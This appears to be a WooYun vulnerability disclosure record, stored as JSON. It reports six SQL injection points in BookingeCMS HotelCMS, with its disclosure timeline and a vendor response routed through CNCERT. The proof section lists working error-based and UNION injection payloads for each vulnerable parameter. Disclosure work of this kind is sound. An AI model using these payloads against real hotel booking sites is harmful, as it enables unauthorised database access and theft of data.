{"id": 71689, "wybug_id": "wooyun-2015-0137378", "wybug_title": "BookingeCMS HotelCMS酒店预订管理系统SQL注入5枚", "wybug_corp": "珠海中新信息科技有限公司", "wybug_author": "路人甲", "wybug_date": "2015-09-04 13:33", "wybug_open_date": "2015-12-06 09:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-10：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-11-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-06：\t细节向公众公开  简要描述： 另外6枚咯~ 详细说明：  　　珠海中新信息科技有限公司开发的BookingeCMS HotelCMS存在多个SQL注入，前面有人xfkxfk提交过这个公司的KTVCMS。与现在提交的系统漏洞不一样。相关产品：\n\nSQL Injection:GET：\n1、/?m=info&rewrite=1                                 rewrite参数存在注入2、/?m=login.checkAccount&account=                    account参数存在注入\nPOST：\n3、/?m=hotel.setSearchSession  POST数据：type=getCityId&cityName=珠海&hotelName=&indate=2015-08-26&outdate=2015-08-29                                    　　　　　　　　　　　　　　　　　　　　　　　　　　　注意：第三处注入需不带cookie注入;否则一直都是提示报错           cityName参数存在注入4、/?m=hotel.getHotelInfoPOST数据：hotelId=1                                    hotelId参数存在注入                           5、/?m=login.check                                   POST数据：account=test'&password=123456                account参数存在注入6、/?m=city.getCity POST数据：provinceId=2200&pageSize=0&json=true         provinceId参数存在注入\nCase:\n\nmask 区域\n1.http://**.**.**/_2.http://**.**.**/_3.http://**.**.**/_4.http://**.**.**/bg/_5.http://**.**.**/_6.http://**.**.**/_7.http://**.**.**/_8.http://**.**.**/_9.http://**.**.**/_10.http://**.**.**/_11.http://**.**.**/\n\n   漏洞证明：  Security Testing: 安全测试SQL注入漏洞，测试注入user()、或者database()注：不排除有小部分站点有安全狗或者其它情况。\n1、测试Payload:?m=info&rewrite=1' UNION ALL SELECT CONCAT(0x7c,IFNULL(CAST(CURRENT_USER() AS CHAR),0x20),0x7c),NULL%23\n\n2、测试Payload:/?m=login.checkAccount&account= ' AND (SELECT 9468 FROM(SELECT COUNT(*),CONCAT(0x7c,(MID((IFNULL(CAST(DATABASE() AS CHAR),0x20)),1,50)),0x7c,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'uNGB'='uNGB\n\n\n\n3、测试Payload:cityName=&type=getCityId&cityName=%E7%A6%8F%E5%B7%9E%' AND (SELECT 4965 FROM(SELECT COUNT(*),CONCAT(0x7c,(MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,50)),0x7c,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'='&indate=2015-08-27&outdate=2015-08-30&address=&hotelName=1\n\n\n\n4、测试Payload:hotelId=11 AND (SELECT 6261 FROM(SELECT COUNT(*),CONCAT(0x7c,(MID((IFNULL(CAST(DATABASE() AS CHAR),0x20)),1,50)),0x7c,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)\n\n\n\n5、测试Payload:account=test' AND (SELECT 1345 FROM(SELECT COUNT(*),CONCAT(0x7c,(MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,50)),0x7c,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'wuaQ'='wuaQ&password=123456 \n\n\n\n6、测试Payload:provinceId=1' AND (SELECT 7525 FROM(SELECT COUNT(*),CONCAT(0x7c,(MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,50)),0x7c,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'IOvh'='IOvh&pageSize=0&json=true\n\n\n\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-09-07 08:58 厂商回复： 暂未建立与软件生产厂商的直接处置渠道,待认领. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}